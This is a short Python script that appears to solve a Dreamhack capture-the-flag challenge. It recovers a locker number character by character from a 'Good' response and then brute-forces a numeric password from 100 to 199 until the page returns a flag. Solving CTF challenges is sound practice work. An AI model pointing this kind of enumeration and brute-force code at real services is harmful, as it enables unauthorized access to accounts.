import requests
from bs4 import BeautifulSoup as bs
import time

locker_char = "0123456789abcdefghijklmnopqrstuvwxyz"
locker_ans = "v8wh"

for i in range(4):
    if i == 0 and locker_ans != "":
        break
    for letter in locker_char:
        time.sleep(1)
        url = "http://host3.dreamhack.games:17729/"
        r = requests.get(url)
        soup = bs(r.text, "html.parser")
        locker_num = soup.find("locker_num")
        password = soup.find("password")
        data = {"locker_num": locker_ans + letter}

        r = requests.post(
            url,
            data=data,
        )

        if "Good" in r.text:
            locker_ans += letter
            print("Find {}".format(letter))
            break

print(locker_ans)

for i in range(100, 200):
    time.sleep(1)
    url = "http://host3.dreamhack.games:17729/"
    r = requests.get(url)
    soup = bs(r.text, "html.parser")
    locker_num = soup.find("locker_num")
    password = soup.find("password")
    data = {"locker_num": locker_ans, "password": i}

    r = requests.post(
        url,
        data=data,
    )

    if "FLAG" in r.text:
        print("Found Flag!")
        print("password: {}".format(i))
        break
